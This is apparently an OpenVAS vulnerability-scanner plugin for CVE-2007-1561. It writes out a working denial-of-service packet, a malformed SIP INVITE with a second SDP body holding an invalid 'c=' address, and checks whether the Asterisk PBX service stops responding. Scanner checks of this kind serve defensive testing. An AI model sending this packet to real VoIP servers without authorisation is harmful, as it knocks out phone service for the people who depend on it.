# OpenVAS Vulnerability Test
# $Id: asterisk_sdp_header_overflow.nasl 16 2013-10-27 13:09:52Z jan $
# Description: Asterisk PBX SDP Header Overflow Vulnerability
#
# Authors:
# Ferdy Riphagen 
#
# Copyright:
# Copyright (C) 2007 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote SIP server is affected by an overflow vulnerability. 

Description :

A version of Asterisk PBX is running on the remote host. Asterisk is 
a complete open-source VoIP system.

The application installed suffers from a remote overflow in the SIP service
resulting in a denial of service. An attacker can send a malformed INVITE packet
with two SDP headers, whitin the first header a existing IP address in the 'c=' variable
and in the second SDP header a NOT existing IP address in 'c='.

This results in a Segmentation fault in 'chan_sip.c' crashing the Asterisk PBX service.";

tag_solution = "Upgrade to Asterisk release 1.4.2/1.2.17 or newer.";

# Note :
# Because probably many systems running safe_asterisk 
# as a watchdog for the asterisk pid, this check could
# be very false-negative prone. Additionaly an INVITE 
# message on secure systems need authentication, so this 
# only works on systems using 'allowguest=yes' in sip.conf
# and for peers without authentication info with the use
# of an edited 'logins.nasl' (not supplied).

if (description) {
 script_id(9999992);
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");
 script_bugtraq_id(23031);
 script_cve_id("CVE-2007-1561");

 name = "Asterisk PBX SDP Header Overflow Vulnerability";
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution; script_description(desc);
 script_name(name);
 summary = "Trigger an SegFault in Atsterisk PBX by parsing a not existing IP in 'c='";
 script_summary(summary);
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2007 Ferdy Riphagen");
 
 script_dependencies("sip_detection.nasl", "logins.nasl");
 script_require_keys("Services/udp/sip");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://lists.grok.org.uk/pipermail/full-disclosure/2007-March/053052.html");
 script_xref(name : "URL" , value : "http://bugs.digium.com/view.php?id=9321");
 exit(0);
}

function get_sip_banner(port) {
    local_var soc, r, opt,  banner;
    global_var port;

    if (islocalhost()) soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:5060, dport:port);
    if (!soc) return NULL;

    opt = string(
        "OPTIONS sip:", get_host_name(), " SIP/2.0", "\r\n",
        "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
        "To: <sip:", get_host_name(), ":", port, ">\r\n",
        "From: <sip:", this_host(), ":", port, ">\r\n",
        "Call-ID: ", rand(), "\r\n",
        "CSeq: ", rand(), " OPTIONS\r\n",
        "Contact: <sip:openvas@", this_host(), ">\r\n",
        "Max-Forwards: 10\r\n",
        "Content-Length: 0\r\n\r\n");

    send(socket:soc, data:opt);
    r = recv(socket:soc, length:1024);
    if ("SIP/2.0" >< r && ("Server:" >< r)) {
        banner = egrep(pattern:'^Server:', string:r);
        banner = substr(banner, 8);
    }
    
    else if ("SIP/2.0" >< r && ("User-Agent" >< r)) {
        banner = egrep(pattern:'^User-Agent', string:r);
        banner = substr(banner, 12);
    }
    
    if (!isnull(banner)) return banner;
    return NULL;
}

function sip_send_recv(port, data) {
    local_var r, soc;
    global_var port, data;

    if (islocalhost()) soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:5060, dport:port);
    if (!soc) return NULL;

    send(socket:soc, data:data);
    r = recv(socket:soc, length:1024);
    if (!isnull(r)) return r;
    return NULL;
}

port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;

# Authentication is not yet used.
#if (!isnull(get_kb_item("sip/login"))) {
#    user = get_kb_item("sip/login") + "@";
#}
user = NULL;

#if (!isnull(get_kb_item("sip/password"))) {
#    pass = get_kb_item("sip/password") + "@";
#}
pass = NULL; 

option = string(
    "OPTIONS sip:", get_host_name(), " SIP/2.0", "\r\n",
    "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
    "To: <sip:", get_host_name(), ":", port, ">\r\n",
    "From: <sip:", this_host(), ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " OPTIONS\r\n",
    "Contact: <sip:openvas@", this_host(), ">\r\n",
    "Max-Forwards: 0\r\n",
    "Content-Length: 0\r\n\r\n");

sdp_headers = string(
    "v=0\r\n",
    "o=somehost 12345 12345 IN IP4 ", get_host_name(), "\r\n",
    "c=IN IP4 ", get_host_name(), "\r\n",
    "m=audio 16384 RTP/AVP 8 0 18 101\r\n\r\n",
    "v=1\r\n",
    "o=somehost 12345 12345 IN IP4 ", get_host_name(), "\r\n",
    "c=IN IP4 555.x.555.x.555\r\n",
    "m=audio 16384 RTP/AVP 8 0 18 101");

bad_invite = string(
    "INVITE sip:", get_host_name(), "\r\n",
    "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
    "To: <sip:", get_host_name(), ":", port, ">\r\n",
    "From: <sip:", user, this_host(), ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " INVITE\r\n",
    "Contact: <sip:", user, this_host(), ">\r\n",
    "Max-Forwards: 0\r\n",
    "Content-Type: application/sdp\r\n",
    "Content-Length: ", strlen(sdp_headers), "\r\n\r\n",
    sdp_headers);

banner = get_sip_banner(port:port);
if ("Asterisk PBX" >!< banner) exit(0);

exp = sip_send_recv(port:port, data:bad_invite);
if (isnull(exp)) {
    res = sip_send_recv(port:port, data:option);
    if (isnull(res)) {
        security_hole(port);
        exit(0);
    }
}
